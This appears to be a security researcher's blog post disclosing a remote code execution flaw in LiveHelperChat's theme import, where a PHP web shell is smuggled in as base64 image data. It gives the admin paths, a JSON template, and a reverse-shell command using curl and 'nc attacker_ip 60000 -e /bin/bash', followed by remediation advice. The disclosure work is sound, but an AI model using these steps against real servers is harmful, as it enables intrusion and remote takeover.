---
layout: post
title: "LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function"
categories: Research
---
## LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function

# Summary:
Upon logging in, an import functionality has been identified that accepted input in a JSON format. The JSON format was analyzed and a base64 encoded PNG image input has been identified. By manipulating the image input parameters, it was possible to upload a malicious php file in order to execute arbitrary code.

# Plugin informations:
Name: Live Helper Chat
Homepage: https://livehelperchat.com/

# Proof of Concept (PoC):
Upon first inspection, there are no themes currently uploaded on the web application. The first step would be to try and upload a PHP file directly in one of the file inputs, however this does not seem to work in our case. 

In order to exploit this vulnerability, we must first create basic theme. Let’s move to the vulnerable directory.

> **/lhc_web/index.php/site_admin/abstract/new/WidgetTheme**{: style="color: red"}

We fill up the required inputs and parameters with dummy data. Then, we go back and download the theme from the Widget directory located here:

> **/lhc_web/index.php/site_admin/abstract/edit/WidgetTheme/1**{: style="color: red"}

When the file is downloaded, we open it and modify the **offline_image_data parameter** as well as the **offline_image_data_ext** parameter
&nbsp;

**Payload:** base64(Image Header + PHP Web Shell)
&nbsp;

**Offline_image_data** is replaced with the payload.
**Offline_image_data_ext** is simply set to “php”.
&nbsp;

The exploit should look something like this:
&nbsp;

```json
{
    "name": "Test",
    "name_company": "Peter Winter",
    "..[SNIP]..": "..[SNIP]..",
    "offline_image_data": "base64_payload",
    "offline_image_data_ext": "php"
}
```
&nbsp;
After the theme with the exploit is prepared it is uploaded on the web server in the following page:
16px
> **/lhc_web/index.php/site_admin/theme/import**{: style="color: red"}
&nbsp;

![import theme]({{ site.baseurl }}/assets/images/image1.png){:.images}
&nbsp;

After the upload is successful, the user must edit the imported theme at the Widget themes section. When the page is loaded, so is the php web shell. In our case, we have identified the path where the shell has been uploaded by viewing the page source and viewing the file path of the **offline_image_data** parameter:

> **/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php**{: style="color: red"}
&nbsp;

Our webshell can execute code on the server by using “cmd” as a parameter. The user can then proceed to set up a reverse shell to their machine by using nc. We then proceed to establishing a reverse shell connection by issuing the following command through the GET method. Firstly, we start a listener on our local machine.
&nbsp;

{% highlight bash %}
> $ nc -lnvp 60000
{% endhighlight %}
&nbsp;

Then, we proceed to send a GET request to the webserver by leveraging our PHP web shell.
&nbsp;

{% highlight bash %}
> $ curl -X GET \ 
http://victim_ip/lhc_web/var/storagetheme/2018y/06/03/2/2c36ce9c8ebb012be3bcb3acb60abbc3.php?cmd=nc+attacker_ip+60000+-e+/bin/bash
{% endhighlight %}
&nbsp;

If the connection is successful, we should get the following message on our listener. Upon issuing the id command, we find out that we are logged in as the www-data user.
&nbsp;

{% highlight bash %}
> $  nc -lnvp 60000
listening on [any] 60000 ...
connect to [attacker_ip] from (UNKNOWN) [vitim_ip] 40248
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}
&nbsp;

# Some of the recommendations for remediating this vulnerability are listed below:

- Restrict file types accepted for upload (check the file extension and only allow certain files to be uploaded.)
- Use a whitelist approach instead of a blacklist. 
- Check for double extensions such as .php.png. 
- Check for files without a filename like .htaccess (on ASP.NET, check for configuration files like web.config). 
- Change the permissions on the upload folder so the files within it are not executable. If possible, rename the files that are uploaded.
- Check OWASP page for unrestricted upload for the rest of best-practice solutions.


# Vulnerability found by:
Me and [0xcela](https://twitter.com/0xcela)
